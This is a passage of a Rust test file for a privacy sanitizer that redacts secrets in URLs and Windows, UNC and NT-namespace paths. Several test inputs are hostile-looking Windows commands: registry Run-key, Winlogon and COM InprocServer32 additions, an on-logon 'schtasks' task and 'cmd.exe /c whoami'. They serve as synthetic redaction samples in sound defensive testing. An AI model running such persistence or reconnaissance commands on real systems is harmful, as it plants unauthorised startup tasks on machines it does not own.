        "https://example.invalid/object?key=TT_PRIVACY_KEY_25&Refresh_Token=TT_PRIVACY_REFRESH_25&sig=TT_PRIVACY_SIG_25&X-Amz-Signature=TT_PRIVACY_AMZ_25&safe=value",
    );

    for marker in [
        "TT_PRIVACY_KEY_25",
        "TT_PRIVACY_REFRESH_25",
        "TT_PRIVACY_SIG_25",
        "TT_PRIVACY_AMZ_25",
    ] {
        assert!(!redacted.contains(marker));
    }
    assert!(redacted.contains("safe=value"));
    assert!(redacted.contains("X-Amz-Signature=[redacted-secret]"));
}

#[test]
fn url_sanitization_sanitizes_content_inside_safe_query_values() {
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        "https://example.invalid/run?message=token:TT_PRIVACY_NESTED_25&encoded=token%3DTT_PRIVACY_ENCODED_NESTED_25&next=%2Fhome%2FTT_PRIVACY_QUERY_PATH_25%2F.ssh%2Fid_rsa&safe=value",
    );

    assert!(!redacted.contains("TT_PRIVACY_NESTED_25"));
    assert!(!redacted.contains("TT_PRIVACY_ENCODED_NESTED_25"));
    assert!(!redacted.contains("TT_PRIVACY_QUERY_PATH_25"));
    assert!(redacted.contains("message="));
    assert!(redacted.contains("next=[sensitive-path]"));
    assert!(redacted.contains("safe=value"));
}

#[test]
fn url_sanitization_handles_websocket_userinfo_ipv6_and_trailing_punctuation() {
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        "wss://user:TT_PRIVACY_WS_USERINFO_25@[2001:db8::1]:9443/mcp?sig=TT_PRIVACY_WS_SIG_25). ws://user:TT_PRIVACY_WS_MALFORMED_25@",
    );

    assert!(!redacted.contains("TT_PRIVACY_WS_"));
    assert!(redacted.contains("wss://[2001:db8::1]:9443/mcp?sig=[redacted-secret])."));
    assert!(redacted.contains("[redacted-url]"));
}

#[test]
fn malformed_websocket_userinfo_fails_closed_and_normal_hosts_remain_structured() {
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        "wss://user:tt_privacy_ws_malformed_25 ws://example.invalid:9443/socket",
    );

    assert!(!redacted.contains("tt_privacy_ws_malformed_25"));
    assert!(redacted.contains("[redacted-url]"));
    assert!(redacted.contains("ws://example.invalid:9443/socket"));
}

#[test]
fn privacy_corpus_handles_malformed_urls_and_path_classes() {
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Diagnostic,
        "https://user:TT_PRIVACY_MALFORMED_25@ /Users/TT_PRIVACY_MAC_25/Library/state /tmp/TT_PRIVACY_TEMP_25 \\\\TT_PRIVACY_UNC_25\\share\\credentials",
    );

    for marker in [
        "TT_PRIVACY_MALFORMED_25",
        "TT_PRIVACY_MAC_25",
        "TT_PRIVACY_TEMP_25",
        "TT_PRIVACY_UNC_25",
    ] {
        assert!(!redacted.contains(marker));
    }
    assert!(redacted.contains("<path>"));
}

#[test]
fn diagnostic_paths_cover_all_absolute_platform_forms_and_spaces() {
    for path in [
        r#"D:\Projects\TT_PRIVACY_DRIVE_25\Project Space\config.json"#,
        "/opt/TT_PRIVACY_OPT_25/project",
        "/var/log/TT_PRIVACY_VAR_25/app.log",
        "/private/tmp/TT_PRIVACY_PRIVATE_25",
        r#"\\server\TT_PRIVACY_UNC_25\Project Space\config.json"#,
    ] {
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, path);
        assert!(!redacted.contains("TT_PRIVACY_"));
        assert_eq!(redacted, "<path>");
    }
}

#[test]
fn windows_device_namespace_drive_paths_are_redacted_in_every_context() {
    let path = r"\\?\C:\Users\example\AppData\Local\Temp\rules.yaml";
    let sanitize = |context| PrivacySanitizer::sanitize(context, path);

    assert_eq!(sanitize(SanitizationContext::Evidence), "[sensitive-path]");
    assert_eq!(sanitize(SanitizationContext::Diagnostic), "<path>");
    assert_eq!(sanitize(SanitizationContext::Url), "[sensitive-path]");
    assert_eq!(sanitize(SanitizationContext::Path), "[sensitive-path]");
    assert_eq!(
        sanitize(SanitizationContext::CommandResult),
        "[sensitive-path]"
    );
    assert_eq!(sanitize(SanitizationContext::Summary), "[sensitive-path]");
    assert_eq!(sanitize(SanitizationContext::Metadata), "[sensitive-path]");
}

#[test]
fn windows_device_namespace_path_forms_are_redacted_whole() {
    let sanitize = |text| PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, text);

    assert_eq!(sanitize(r"\\.\C:\Users\example\notes.txt"), "<path>");
    assert_eq!(sanitize(r"\\?\c:\users\example\notes.txt"), "<path>");
    assert_eq!(sanitize(r"\\?\C:/Users/example/notes.txt"), "<path>");
    assert_eq!(sanitize(r"\\.\D:\Users/example\notes.txt"), "<path>");
    assert_eq!(sanitize(r"\\?\C:"), "<path>");
    assert_eq!(
        sanitize(r"\\?\C:\Users\example\Project Space\notes.txt"),
        "<path>"
    );
    assert_eq!(
        sanitize(r"\\?\Volume{12345678-1234-1234-1234-123456789abc}\Users\example\notes.txt"),
        "<path>"
    );
    assert_eq!(
        sanitize(r"\\?\UNC\server\share\example\notes.txt"),
        "<path>"
    );
    // Forward-slash spellings are read as scheme-relative URLs first.
    assert_eq!(
        sanitize(r"//?/C:/Users/example/notes.txt"),
        "[redacted-url]"
    );
    assert_eq!(sanitize(r"//./C:/Users/example/notes.txt"), "//./<path>");
    // The prefix alone, named in prose, is not a path.
    assert_eq!(
        sanitize(r"paths that start with \\?\ are verbatim"),
        r"paths that start with \\?\ are verbatim"
    );
}

#[test]
fn windows_device_namespace_paths_in_text_redact_only_the_path() {
    let sanitize = |text| PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, text);

    assert_eq!(
        sanitize(r"failed to read \\?\C:\Users\example\notes.txt now"),
        "failed to read <path> now"
    );
    assert_eq!(
        sanitize(r#"open "\\?\C:\Users\example\notes.txt" failed"#),
        r#"open "<path>" failed"#
    );
    assert_eq!(
        sanitize(r"open '\\.\C:\Users\example\notes.txt' failed"),
        "open '<path>' failed"
    );
    assert_eq!(
        sanitize(r"explicit:\\?\C:\Users\example\AppData\Local\Temp\rules.yaml#document:0"),
        "explicit:<path>:0"
    );
    assert_eq!(
        sanitize(r"path=\\?\C:\Users\example\notes.txt"),
        "path=<path>"
    );
    assert_eq!(sanitize(r"\\?\C:\Users\example\notes.txt:12"), "<path>:12");
    assert_eq!(
        sanitize(r"\\?\C:\Users\example\notes.txt#section"),
        "<path>"
    );
    assert_eq!(
        sanitize(
            r"\\?\C:\Users\example\a.txt and \\.\D:\Data\example\b.txt and \\?\UNC\server\share\example\c.txt"
        ),
        "<path> and <path> and <path>"
    );
}

/// Asserts the sanitized text in every context: `evidence` is the
/// expectation for every context except `Diagnostic`, which uses its own
/// path marker.
fn assert_every_context(input: &str, evidence: &str, diagnostic: &str) {
    for context in [
        SanitizationContext::Evidence,
        SanitizationContext::Url,
        SanitizationContext::Path,
        SanitizationContext::CommandResult,
        SanitizationContext::Summary,
        SanitizationContext::Metadata,
    ] {
        assert_eq!(
            PrivacySanitizer::sanitize(context, input),
            evidence,
            "{context:?}"
        );
    }
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, input),
        diagnostic
    );
}

#[test]
fn json_escaped_drive_paths_are_redacted_in_every_context() {
    assert_every_context(
        r#"{"path":"C:\\Users\\example\\Project Space\\notes.txt"}"#,
        r#"{"path":"[sensitive-path]"}"#,
        r#"{"path":"<path>"}"#,
    );
}

#[test]
fn json_escaped_unc_paths_are_redacted_in_every_context() {
    assert_every_context(
        r#"{"path":"\\\\server\\share\\example\\notes.txt"}"#,
        r#"{"path":"[sensitive-path]"}"#,
        r#"{"path":"<path>"}"#,
    );
}

#[test]
fn json_escaped_device_namespace_paths_are_redacted_in_every_context() {
    assert_every_context(
        r#"{"path":"\\\\?\\C:\\Users\\example\\notes.txt"}"#,
        r#"{"path":"[sensitive-path]"}"#,
        r#"{"path":"<path>"}"#,
    );
}

#[test]
fn json_escaped_device_namespace_path_forms_are_redacted_whole() {
    let sanitize = |text| PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, text);

    assert_eq!(sanitize(r"\\\\.\\C:\\Users\\example\\notes.txt"), "<path>");
    assert_eq!(
        sanitize(r"\\\\?\\UNC\\server\\share\\example\\notes.txt"),
        "<path>"
    );
    assert_eq!(
        sanitize(r"\\\\?\\Volume{12345678-1234-1234-1234-123456789abc}\\Users\\example\\notes.txt"),
        "<path>"
    );
}

#[test]
fn json_escaped_paths_inside_escaped_text_redact_only_the_path() {
    let sanitize = |text| PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, text);

    assert_eq!(
        sanitize(r#""exit\r\nC:\\Users\\example>dir""#),
        r#""exit\r\n<path>>dir""#
    );
    assert_eq!(
        sanitize(r#""type \"C:\\Users\\example\\notes.txt\" now""#),
        r#""type \"<path>\" now""#
    );
    assert_eq!(
        sanitize(r#"{"cmd":"copy \\\\server\\share\\a.txt C:\\Temp\\b.txt\n"}"#),
        r#"{"cmd":"copy <path> <path>\n"}"#
    );
}

#[test]
fn twice_escaped_windows_paths_are_redacted() {
    let sanitize = |text| PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, text);

    assert_eq!(
        sanitize(r#"{\"path\":\"C:\\\\Users\\\\example\\\\notes.txt\"}"#),
        r#"{\"path\":\"<path>\"}"#
    );
    assert_eq!(
        sanitize(r"\\\\\\\\server\\\\share\\\\example\\\\notes.txt"),
        "<path>"
    );
}

#[test]
fn mixed_width_windows_paths_are_redacted_whole() {
    let sanitize = |text| PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, text);

    assert_eq!(sanitize(r"C:\\Users\alice\secret.txt"), "<path>");
    assert_eq!(sanitize(r"\\\\server\\share\deep\secret"), "<path>");
    assert_eq!(sanitize(r"\\\\?\\C:\\Users\alice\secret.txt"), "<path>");
    assert_eq!(
        sanitize(r"\\\\?\\UNC\\server\\share\deep\secret.txt"),
        "<path>"
    );
    assert_eq!(
        sanitize(r"open C:\\Users\\alice\secret.txt now"),
        "open <path> now"
    );
    assert_eq!(sanitize(r"open C:\Users\\alice\\secret.txt"), "open <path>");
    assert_eq!(sanitize(r"open C:\Users\alice\\secret.txt"), "open <path>");
    assert_eq!(sanitize(r"dir \\server\share\\team\\a.txt"), "dir <path>");
    assert_eq!(sanitize(r"open C:\\Users\alice\secret.txt"), "open <path>");
    assert_eq!(
        sanitize(r"open C:\Users\\alice\\\\Desktop\secret.txt:12 now"),
        "open <path>:12 now"
    );
    assert_eq!(
        sanitize(r"open \\?\C:\Users\\alice\\\\secret.txt now"),
        "open <path> now"
    );
}

#[test]
fn plain_start_windows_paths_with_escaped_tails_are_redacted_in_every_context() {
    assert_every_context(
        r"open C:\Users\\alice\\secret.txt and \\server\share\\team\\a.txt",
        "open [sensitive-path] and [sensitive-path]",
        "open <path> and <path>",
    );
}

/// Generated paths for every drive, UNC and device-namespace start, plain
/// or escaped, whose later separators are 1, 2 or 4 backslashes in any
/// order: each is replaced whole.
#[test]
fn mixed_width_windows_paths_are_redacted_whole_for_every_separator_mix() {
    let separators = [r"\", r"\\", r"\\\\"];
    for prefix in [
        "C:",
        r"\\server\share",
        r"\\\\server\\share",
        r"\\?\C:",
        r"\\\\?\\C:",
        r"\\?\UNC\server\share",
    ] {
        for first in separators {
            for second in separators {
                for third in separators {
                    let input = format!(
                        "read {prefix}{first}Alphaone{second}Bravotwo{third}Charlie.txt now"
                    );
                    assert_eq!(
                        PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, &input),
                        "read <path> now",
                        "{input}"
                    );
                }
            }
        }
    }
}

/// Escaped text that only contains single escaped backslashes, such as a
/// registry key or an escaped newline, is not a path.
#[test]
fn json_escaped_registry_keys_and_escapes_are_kept() {
    for kept in [
        r"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater",
        r#"printf \"a\\nb\\nc\""#,
        r"Get-ChildItem HKLM:\Software\Microsoft",
    ] {
        assert_eq!(redact_sensitive_text(kept), kept);
    }
}

/// Text that starts with `//name/` is ambiguous: a build label, a document
/// query and a depot path are spelled like a network path with forward
/// slashes. It is read as a scheme-relative URL, never redacted whole as
/// a Windows path.
#[test]
fn double_slash_names_are_read_as_urls_not_as_windows_paths() {
    for kept in [
        "bazel build //app/server:binary",
        "xpath //div/span/text()",
        "p4 sync //depot/main/src/...",
        "open //server/share/example/notes.txt now",
        "copy //192.0.2.10/share/a.txt .",
        "dir //FILESRV01/share",
    ] {
        assert_eq!(redact_sensitive_text(kept), kept);
        assert_eq!(
            PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, kept),
            kept
        );
    }
}

#[test]
fn nt_object_namespace_paths_are_redacted_whole_and_idempotently() {
    let cases = [
        (
            r"\Device\HarddiskVolume3\Users\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"dir \Device\HarddiskVolume3\Users\Synthetic User\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r"\Device\HarddiskVolumeShadowCopy1\Users\SyntheticUser\secret.txt",
            "[sensitive-path]",
        ),
        (
            r"\Device\Mup\fileserver\share\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"\Device\LanmanRedirector\;Z:0000000000012345\fileserver\share\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"\Device\Mup\;LanmanRedirector\;Z:0000000000012345\fileserver\share\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"\Device\Volume{12345678-1234-1234-1234-1234567890ab}\Users\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (r"\Device\NamedPipe\SyntheticPipe", "[sensitive-path]"),
        (r"\??\C:\Users\SyntheticUser\notes.txt", "[sensitive-path]"),
        (
            r"\??\UNC\fileserver\share\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"\??\Volume{12345678-1234-1234-1234-1234567890ab}\Users\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"\GLOBAL??\C:\Users\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"\GLOBAL??\UNC\fileserver\share\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"\DosDevices\C:\Users\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"\DosDevices\UNC\fileserver\share\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r#"{"path":"\\Device\\HarddiskVolume3\\Users\\SyntheticUser\\notes.txt"}"#,
            r#"{"path":"[sensitive-path]"}"#,
        ),
        (
            r#"{\"path\":\"\\\\Device\\\\HarddiskVolume3\\\\Users\\\\SyntheticUser\\\\notes.txt\"}"#,
            r#"{\"path\":\"[sensitive-path]\"}"#,
        ),
        (
            r"\Device\HarddiskVolume3\\Users\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r"\\Device\\HarddiskVolume3\Users\SyntheticUser\notes.txt",
            "[sensitive-path]",
        ),
        (
            r#"{"path":"\\??\\C:\\Users\\SyntheticUser\\notes.txt"}"#,
            r#"{"path":"[sensitive-path]"}"#,
        ),
        (
            r#"{"path":"\\??\\UNC\\fileserver\\share\\notes.txt"}"#,
            r#"{"path":"[sensitive-path]"}"#,
        ),
        (
            r#"{"path":"\\GLOBAL??\\UNC\\fileserver\\share\\notes.txt"}"#,
            r#"{"path":"[sensitive-path]"}"#,
        ),
        (
            r#"{"path":"\\DosDevices\\UNC\\fileserver\\share\\notes.txt"}"#,
            r#"{"path":"[sensitive-path]"}"#,
        ),
        (
            r"exit\r\n\Device\HarddiskVolume3\Users\SyntheticUser\notes.txt",
            r"exit\r\n[sensitive-path]",
        ),
        (
            r"dir \Device\HarddiskVolume3\file.txt; echo ok",
            "dir [sensitive-path]; echo ok",
        ),
    ];

    for (case, (input, expected)) in cases.into_iter().enumerate() {
        let redacted = redact_sensitive_text(input);
        assert!(redacted == expected, "NT path case {case}");
        assert!(
            redact_sensitive_text(&redacted) == redacted,
            "NT idempotence case {case}"
        );
    }

    let nt_path = r"\Device\HarddiskVolume3\Users\SyntheticUser\notes.txt";
    for context in [
        SanitizationContext::Evidence,
        SanitizationContext::Diagnostic,
        SanitizationContext::Url,
        SanitizationContext::Path,
        SanitizationContext::CommandResult,
        SanitizationContext::Summary,
        SanitizationContext::Metadata,
    ] {
        let expected = if context == SanitizationContext::Diagnostic {
            "<path>"
        } else {
            "[sensitive-path]"
        };
        let redacted = PrivacySanitizer::sanitize(context, nt_path);
        assert!(redacted == expected, "NT path context {context:?}");
        assert!(
            PrivacySanitizer::sanitize(context, &redacted) == redacted,
            "NT idempotence context {context:?}"
        );
    }

    let url = "https://example.invalid/open?p=%5CDevice%5CHarddiskVolume3%5CUsers%5CSyntheticUser%5Cnotes.txt&safe=ok";
    let redacted_url = PrivacySanitizer::sanitize(SanitizationContext::Url, url);
    assert_eq!(
        redacted_url,
        "https://example.invalid/open?p=[sensitive-path]&safe=ok"
    );
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, &redacted_url),
        redacted_url
    );
}

#[test]
fn mixed_width_and_escaped_unc_paths_redact_server_names_whole() {
    let cases = [
        (r"dir \\fileserver\\share\notes.txt", "dir [sensitive-path]"),
        (
            r"dir \\fileserver\\share\\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r"dir \\fileserver\\\share\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r"dir \\fileserver\\\\share\\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r"dir \\\\fileserver\share\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r"dir \\\\fileserver\\\\share\\notes.txt",
            "dir [sensitive-path]",
        ),
        (r"dir \\\fileserver\share\notes.txt", "dir [sensitive-path]"),
        (
            r"dir \\fileserver\\Shared Docs\\SyntheticUser\\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r#"{"path":"\\fileserver\\share\\notes.txt"}"#,
            r#"{"path":"[sensitive-path]"}"#,
        ),
        (
            r#"{"path":"\\\\fileserver\\\\share\\notes.txt"}"#,
            r#"{"path":"[sensitive-path]"}"#,
        ),
        (
            r"dir \\10.0.0.5\\c$\\Users\\SyntheticUser\\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r"exit\r\n\\fileserver\\share\notes.txt",
            r"exit\r\n[sensitive-path]",
        ),
        (
            r"dir \\?\\C:\Users\SyntheticUser\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r"dir \\\\?\C:\Users\SyntheticUser\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r"dir \\?\\UNC\\fileserver\\share\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r"dir \\?\\Volume{12345678-1234-1234-1234-1234567890ab}\Users\SyntheticUser\notes.txt",
            "dir [sensitive-path]",
        ),
        (r"dir \\.\\pipe\\SyntheticPipe", "dir [sensitive-path]"),
        (r"dir \\\\.\pipe\SyntheticPipe", "dir [sensitive-path]"),
    ];

    for (case, (input, expected)) in cases.into_iter().enumerate() {
        let redacted = redact_sensitive_text(input);
        assert!(redacted == expected, "UNC path case {case}");
        assert!(!redacted.contains("fileserver"), "UNC server case {case}");
        assert!(!redacted.contains("Synthetic"), "UNC privacy case {case}");
        assert!(
            redact_sensitive_text(&redacted) == redacted,
            "UNC idempotence case {case}"
        );
    }
}

/// The URL reading still redacts what a URL may not show.
#[test]
fn double_slash_names_keep_url_redaction_of_home_directories() {
    let redacted = redact_sensitive_text("open //server/Users/example/notes.txt now");
    assert!(!redacted.contains("example"), "{redacted}");
}

/// Starts of eight or more backslashes and trailing single-backslash
/// escaped whitespace (`\n`, `\r`, `\t`) behave deterministically and
/// idempotently while keeping real filenames and escaped registry keys.
#[test]
fn long_backslash_starts_and_trailing_escaped_whitespace_are_pinned() {
    let sanitize = |text| PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, text);

    for masked in [
        r"open \\\\\\\\server\\share\\notes.txt now",
        r"open \\\\\\\\server\share\notes.txt now",
        r"open \\\\\\\\\\\\server\\\\share\\\\notes.txt now",
        r"open \\\\\\\\\\\\\\\\server\\\\\\\\share\\\\\\\\notes.txt now",
        r"open C:\\\\\\\\Users\\\\\\\\example\\\\\\\\notes.txt now",
    ] {
        assert_every_context(masked, "open [sensitive-path] now", "open <path> now");
    }

    for kept in [
        r"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        r"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows",
    ] {
        assert_eq!(redact_sensitive_text(kept), kept);
        assert_eq!(sanitize(kept), kept);
    }

    assert_eq!(
        sanitize(r#"{"cmd":"type C:\\Temp\\b.txt\r\n"}"#),
        r#"{"cmd":"type <path>\r\n"}"#
    );
    assert_eq!(
        sanitize(r#"{"cmd":"dir \\\\server\\share\\a.txt\t"}"#),
        r#"{"cmd":"dir <path>\t"}"#
    );
    assert_eq!(
        sanitize(r#"{"cmd":"type C:\\Temp\\Private Notes.txt\n"}"#),
        r#"{"cmd":"type <path>\n"}"#
    );
    // Trailing escaped whitespace must not cause spaced-filename extension
    // to swallow following commands or quoted arguments.
    assert_eq!(
        sanitize(r#"{"cmd":"type C:\\Temp\\b.txt\n cmd.exe /c whoami"}"#),
        r#"{"cmd":"type <path>\n cmd.exe /c whoami"}"#
    );
    assert_eq!(
        sanitize(r#""C:\tools\a.exe\n arg1 arg2""#),
        r#""<path>\n arg1 arg2""#
    );
    // Chained Windows paths separated directly by `\n` or `\r\n` must both
    // redact whole without leaking the second path's drive tail.
    assert_every_context(
        r"C:\Temp\a.txt\nC:\Users\SyntheticUser\secret.txt",
        r"[sensitive-path]\n[sensitive-path]",
        r"<path>\n<path>",
    );
    assert_every_context(
        r"C:\Temp\a.txt\r\n\\?\C:\Users\SyntheticUser\secret.txt",
        r"[sensitive-path]\r\n[sensitive-path]",
        r"<path>\r\n<path>",
    );
    assert_every_context(
        r"C:\Temp\a.txt\n\??\C:\Users\SyntheticUser\secret.txt",
        r"[sensitive-path]\n[sensitive-path]",
        r"<path>\n<path>",
    );
    assert_eq!(
        redact_sensitive_text(r#"{"log":"C:\\Temp\\a.txt\nC:\\SyntheticSecret.txt"}"#),
        r#"{"log":"[sensitive-path]\n[sensitive-path]"}"#
    );
    // The escape before the second path is found from the match's end,
    // however long the first path and its own escapes are.
    let chained = format!(
        r"C:\Temp{}\a.txt\n\nC:\Users\SyntheticUser\secret.txt",
        r"\nested".repeat(400)
    );
    assert_eq!(sanitize(&chained), r"<path>\n\n<path>");
    assert_eq!(
        redact_sensitive_text(r#"{"log":"C:\\Temp\\a.txt\r\n\\\\?\\C:\\SyntheticSecret.txt"}"#),
        r#"{"log":"[sensitive-path]\r\n[sensitive-path]"}"#
    );
    // A device prefix escaped to any width is read back from the match's
    // end, so the second path is still matched whole.
    for width in [1, 2, 4, 8] {
        let sep = r"\".repeat(width);
        let prefix = format!("{}?{sep}", sep.repeat(2));
        let chained = format!(
            r"C:{sep}Temp{sep}a.txt\n{prefix}C:{sep}Users{sep}SyntheticUser{sep}secret.txt"
        );
        assert_eq!(
            PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, &chained),
            r"<path>\n<path>",
            "width {width}"
        );
    }
    // Non-drive Windows path branches preserve trailing escaped whitespace.
    assert_eq!(sanitize(r"\\?\C:\Temp\b.txt\n"), "<path>\\n");
    assert_eq!(
        sanitize(r"\Device\HarddiskVolume3\Users\example\b.txt\n"),
        "<path>\\n"
    );
    assert_eq!(sanitize(r"C:/Temp/b.txt\n"), "<path>\\n");
    assert_eq!(sanitize(r"~\Temp\b.txt\n"), "<path>\\n");
    // After a component that is no file name, the same bytes can name a
    // child, so they stay in the marker: the name is not left readable.
    assert_eq!(sanitize(r"C:\n\r\n"), "<path>");
    assert_eq!(sanitize(r"C:\Users\example\n"), "<path>");
    assert_every_context(
        r"C:\Users\SyntheticUser\n Notes.txt",
        "[sensitive-path]",
        "<path>",
    );
    // With doubled separators a single backslash separates nothing.
    assert_eq!(
        sanitize(r#"{"cmd":"dir C:\\Users\\SyntheticUser\n Notes.txt"}"#),
        r#"{"cmd":"dir <path>\n Notes.txt"}"#
    );
    // Real filenames starting with n/r/t and escaped-separator `\\n` stay redacted.
    assert_eq!(sanitize(r"C:\Users\example\notes.txt"), "<path>");
    assert_eq!(sanitize(r"C:\\Users\\example\\n"), "<path>");
    assert_eq!(sanitize(r"C:\Users\example\readme.md"), "<path>");
    assert_eq!(sanitize(r"C:\Users\example\token.pem"), "<path>");
    assert_eq!(sanitize(r"C:\n"), "<path>");
    assert_eq!(sanitize(r"\\server\n"), "<path>");

    // Long trailing `\n` runs stay within linear sanitizer work budget.
    let long_escapes = format!(r"C:\a.txt{}", r"\n".repeat(2044));
    let mut charged = 0usize;
    let out = PrivacySanitizer::try_sanitize(
        SanitizationContext::Diagnostic,
        &long_escapes,
        &mut |bytes| {
            charged = charged.saturating_add(bytes);
            Ok::<_, std::convert::Infallible>(())
        },
    )
    .expect("linear sanitize");
    assert!(out.starts_with(r"<path>\n"), "{out}");

    // Idempotent across every sanitization context.
    for context in [
        SanitizationContext::Evidence,
        SanitizationContext::Diagnostic,
        SanitizationContext::Url,
        SanitizationContext::Path,
        SanitizationContext::CommandResult,
        SanitizationContext::Summary,
        SanitizationContext::Metadata,
    ] {
        let redacted = PrivacySanitizer::sanitize(context, r#"{"cmd":"type C:\\Temp\\b.txt\r\n"}"#);
        assert_eq!(PrivacySanitizer::sanitize(context, &redacted), redacted);
    }
}

/// Scheme-relative URLs, URLs with doubled slashes and ordinary `//` text
/// keep their current treatment.
#[test]
fn urls_and_ordinary_double_slash_text_are_not_read_as_unc_paths() {
    for kept in [
        r#"<script src="//cdn.example.com/lib/app.js"></script>"#,
        "fetch //api.example.com:8443/v1/items",
        "//localhost:8080/health",
        "https://example.invalid/a//b/c",
        "http://host//double/slash",
        "a // b",
        "x = n//2/3",
        "call(); //eslint-disable-line",
        "//server",
    ] {
        assert_eq!(redact_sensitive_text(kept), kept);
    }
}

#[test]
fn drive_paths_after_a_digit_or_underscore_are_redacted() {
    let sanitize = |text| PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, text);

    assert_eq!(sanitize(r"out_C:\Users\example\notes.txt"), "out_<path>");
    assert_eq!(sanitize(r"2C:\Users\example\notes.txt"), "2<path>");
}

#[test]
fn windows_drive_slash_variants_and_backslash_home_paths_are_redacted_whole() {
    let cases = [
        ("C:/Users/SyntheticUser/notes.txt", "[sensitive-path]"),
        ("C:/Users", "[sensitive-path]"),
        ("C:/Program Files/My App/notes.txt", "[sensitive-path]"),
        (r"C:\Program Files/My App/notes.txt", "[sensitive-path]"),
        (r"C:/Users\SyntheticUser/notes.txt", "[sensitive-path]"),
        (r"C:\\\Users\SyntheticUser\notes.txt", "[sensitive-path]"),
        (
            "schtasks /create /tn Updater /tr C:/tools/a.exe /sc onlogon",
            "schtasks /create /tn Updater /tr [sensitive-path] /sc onlogon",
        ),
        (
            r"dir ~\My Docs\SyntheticUser\notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r#"{"path":"~\\My Docs\\SyntheticUser\\notes.txt"}"#,
            r#"{"path":"[sensitive-path]"}"#,
        ),
    ];

    for (case, (input, expected)) in cases.into_iter().enumerate() {
        let redacted = redact_sensitive_text(input);
        assert!(redacted == expected, "drive/home path case {case}");
        assert!(
            !redacted.contains("SyntheticUser"),
            "drive/home privacy case {case}"
        );
        assert!(
            redact_sensitive_text(&redacted) == redacted,
            "drive/home idempotence case {case}"
        );
    }
}

#[test]
fn windows_path_redaction_preserves_registry_keys_urls_flags_and_escapes() {
    let preserved = [
        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater",
        r"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater",
        r"reg add HKCU\\Software\Microsoft\Run /v Updater",
        r#"reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon""#,
        r"reg add HKCU\\Software\\Classes\\CLSID\\{12345678-1234-1234-1234-1234567890ab}\\InprocServer32\\Default",
        r"reg query HKLM\SYSTEM\CurrentControlSet\Enum\Device\Parameters",
        r"reg query HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
        r#"printf "hello\\n\\tworld""#,
        r#"re.split("\\r\\n", text)"#,
        r#"printf "\\n\\t""#,
        r#"grep -E "\\d+\\s+\\w+""#,
        r#"{"label":"\\u0061\\u0062"}"#,
        r#"{"hex":"\\x0d\\x0a"}"#,
        "https://example.invalid/api/v1/device/123",
        "bazel build //app/server:binary",
        "open //server/share/example/notes.txt now",
    ];

    for (case, input) in preserved.into_iter().enumerate() {
        let redacted = redact_sensitive_text(input);
        assert!(redacted == input, "nonpath case {case}");
        assert!(
            redact_sensitive_text(&redacted) == redacted,
            "nonpath idempotence case {case}"
        );
    }

    assert_eq!(
        redact_sensitive_text(r#""\\r\\nC:\\Users\\SyntheticUser\\notes.txt""#),
        r#""\\r\\n[sensitive-path]""#
    );
}

#[test]
fn unicode_registry_keys_remain_metadata() {
    let input = r"reg query HKCU\\Software\\软件\\下一\\值";
    assert!(
        redact_sensitive_text(input) == input,
        "Unicode registry key boundary"
    );
}

#[test]
fn unicode_unc_server_names_are_redacted_without_losing_boundaries() {
    let redacted = redact_sensitive_text(r"dir \\büro\team\notes.txt now");
    assert!(redacted == "dir [sensitive-path] now", "Unicode UNC path");
    assert!(
        redact_sensitive_text(&redacted) == redacted,
        "Unicode UNC idempotence"
    );
    assert!(
        redact_sensitive_text("dir \\\\bu\u{0308}ro\\team\\notes.txt now")
            == "dir [sensitive-path] now",
        "decomposed Unicode UNC path"
    );
    assert!(
        redact_sensitive_text(r"dir \\文件\共享\notes.txt now") == "dir [sensitive-path] now",
        "CJK UNC path"
    );
    assert!(
